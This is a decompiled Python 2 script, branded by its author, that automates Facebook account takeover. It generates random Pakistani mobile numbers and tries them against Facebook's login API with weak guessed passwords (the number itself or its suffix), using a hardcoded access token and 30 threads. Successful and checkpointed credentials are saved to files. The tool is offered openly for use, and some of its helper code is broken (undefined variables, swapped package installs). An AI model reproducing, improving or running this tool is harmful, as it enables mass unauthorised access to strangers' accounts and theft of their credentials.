# Decompile by - Yunus Rakhshani
# Facebook - ZOHAN
import os, sys, time, datetime, random, hashlib, re, threading, json, urllib, cookielib, getpass
os.system('rm -rf .txt')
for n in range(50000):
    nmbr = random.randint(1111111, 9999999)
    sys.stdout = open('.txt', 'a')
    print nmbr
    sys.stdout.flush()
try:
    import requests
except ImportError:
    os.system('pip2 install mechanize')
try:
    import mechanize
except ImportError:
    os.system('pip2 install request')
    time.sleep(1)
    os.system('python2 nmbr. py')
from multiprocessing.pool import ThreadPool
from requests.exceptions import ConnectionError
from mechanize import Browser
reload(sys)
sys.setdefaultencoding('utf8')
br = mechanize.Browser()
br.set_handle_robots(False)
br.set_handle_refresh(mechanize._http.HTTPRefreshProcessor(), max_time=1)
br.addheaders = [('user-agent', 'Dalvik/1.6.0 (Linux; U; Android 4.4.2; NX55 Build/KOT5506) [FBAN/FB4A;FBAV/106.0.0.26.68;FBBV/45904160;FBDM/{density=3.0,width=1080,height=1920};FBLC/it_IT;FBRV/45904160;FBCR/PosteMobile;FBMF/asus;FBBD/asus;FBPN/com.facebook.katana;FBDV/ASUS_Z00AD;FBSV/5.0;FBOP/1;FBCA/x86:armeabi-v7a;]')]
def acak(b):
    w = 'ahtdzjc'
    d = ''
    for i in x:
        d += '!' + w[random.randint(0, len(w) - 1)] + i
    return cetak(d)
def cetak(b):
    w = 'ahtdzjc'
    for i in w:
        j = w.index(i)
        x = x.replace('!%s' % i, '\x1b[%s;1m' % str(31 + j))
    x += '\x1b[0m'
    x = x.replace('!0', '\x1b[0m')
    sys.stdout.write(x + '\n')
logo = '\x1b[1;0m\n\x1b[1;97m-----------------------------------------------\n\x1b[1;92m[+]\x1b[1;97m AUTHOR \x1b[1;97m : \x1b[1;97m   THE YUNUS\n\x1b[1;92m[+]\x1b[1;97m GITHUB\x1b[1;97m  :  \x1b[1;97m  The-Yunus-2003x18\n\x1b[1;92m[+]\x1b[1;97m FACEBOOK\x1b[1;97m:  \x1b[1;97m  ZOHAN\n\x1b[1;92m[+] \x1b[1;97mBRAND   \x1b[1;97m:    \x1b[1;97mTHE LEGEND OF DG KHAN\n\x1b[1;92m[+] \x1b[1;97mTEAM    \x1b[1;97m:    \x1b[1;97mTHE YUNUS Y-TECH PROGRAMMING\n\x1b[1;92m[+]\x1b[1;97m VERSION\x1b[1;97m : \x1b[1;97m   1.0.1\n\x1b[1;97m----------------------------\x1b[1;97m-------------------\x1b[1;91m                 Fuck FB System      '
logo1 = '     \n\n\x1b[4;93mSELECT PAK  SIM CODE \x1b[1;0m\n\x1b[1;97m[+] Jazz    : \x1b[1;92m 00,01,02,03,04,05,06,07,08\n\x1b[1;97m[+] Zong    : \x1b[1;92m 11,12,13,14,15,16,17\n\x1b[1;97m[+] Warid   : \x1b[1;92m 21,22,23,24,25\n\x1b[1;97m[+] Ufone   : \x1b[1;92m 30,31,32,33,34,35\n\x1b[1;97m[+] Telenor : \x1b[1;92m 40,41,42,43,44,45,46,47\n\n\n\n\x1bx \x1b[1;97m\x1b[1;0m\n'
back = 0
berhasil = []
cekpoint = []
oks = []
id = []
cpb = []
def menu():
    os.system('clear')
    print logo
    print '\x1b[1;91m--------------------------------------------------'
    print
    print '\x1b[1;93m[1] \033[1;92mStart Random Number Cloning'
    print
    print '\x1b[1;93m--------------------------------------------------'
    action()
def action():
    global cpb
    global oks
    ss = raw_input('\x1b[1;97m>\x1b[1;92m>\x1b[1;96m>\x1b[1;93m> ')
    if ss == '':
        print '[!] Warning'
        action()
    elif ss == '1':
        os.system('clear')
        print logo
        print logo1
        try:
            c = raw_input('\x1b[1;97mCODE : ')
            k = '03'
            idlist = '.txt'
            for line in open(idlist, 'r').readlines():
                id.append(line.strip())
        except IOError:
            print '[!] File Not Found'
            raw_input('\n[ Back ]')
            menu()
    elif ss == '0':
        menu()
    else:
        print '[!] Select valid option'
        action()
    os.system('clear')
    print logo
    print '\x1b[1;93m   Use flight (airplane) mode before use'
    print '\x1b[1;91m------------------------------------------------'
    sss = str(len(id))
    print '\x1b[1;92m            TOTAL IDS :\x1b[1;97m ' + sss
    print '\x1b[1;91m-----------------------------------------------'
    def main(arg):
        user = arg
        try:
            os.mkdir('save')
        except OSError:
            pass
        try:
            pass1 = user
            data = br.open('https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=1&email=' + k + c + user + '&locale=en_US&password=' + pass1 + '&sdk=ios&generate_session_cookies=1&sig=3f555f98fb61fcd7aa0c44f58f522efm')
            q = json.load(data)
            if 'access_token' in q:
                print '\x1b[1;92m  [OK] ' + k + c + user + '  |  ' + pass1
                okb = open('save/CP.txt', 'a')
                okb.write(k + c + user + pass1 + '\n')
                okb.close()
                oks.append(c + user + pass1)
            elif 'www.facebook.com' in q['error_msg']:
                print '\x1b[1;97m  [CP] ' + k + c + user + '  |  ' + pass1
                cps = open('save/CP.txt', 'a')
                cps.write(k + c + user + pass1 + '\n')
                cps.close()
                cpb.append(c + user + pass1)
            else:
                pass2 = k + c + user
                data = br.open('https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=1&email=' + k + c + user + '&locale=en_US&password=' + pass2 + '&sdk=ios&generate_session_cookies=1&sig=3f555f98fb61fcd7aa0c44f58f522efm')
                q = json.load(data)
                if 'access_token' in q:
                    print '\x1b[1;92m  [OK] ' + k + c + user + '  |  ' + pass2
                    okb = open('save/OK.txt', 'a')
                    okb.write(k + c + user + pass2 + '\n')
                    okb.close()
                    oks.append(c + user + pass2)
                elif 'www.facebook.com' in q['error_msg']:
                    print '\x1b[1;97m  [CP] ' + k + c + user + '  |  ' + pass2
                    cps = open('save/CP.txt', 'a')
                    cps.write(k + c + user + pass2 + '\n')
                    cps.close()
                    cpb.append(c + user + pass2)
                   
        except:
            pass
    p = ThreadPool(30)
    p.map(main, id)
    print '\x1b[1;97m-----------------------------------------------------'
    print 'Process Has Been Completed ...'
    print 'Total OK : ' + str(len(oks))
    print 'Total CP : ' + str(len(cpb))
    print '\x1b[1;97m-----------------------------------------------------'
    raw_input('Press Enter To Back Menu ')
if __name__ == '__main__':
    menu()
